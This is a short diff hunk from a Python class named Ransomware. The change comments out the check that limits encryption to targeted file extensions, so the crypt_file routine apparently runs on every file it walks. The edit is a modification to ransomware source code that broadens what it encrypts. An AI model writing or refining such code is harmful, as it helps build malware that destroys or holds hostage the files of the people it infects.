@@ -73,8 +73,10 @@ class Ransomware:
 
 
             # if not a file extension target
+                """
                 if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                     continue 
+                """
             
 
                 self.crypt_file(abs_file_path, encrypted=encrypted)
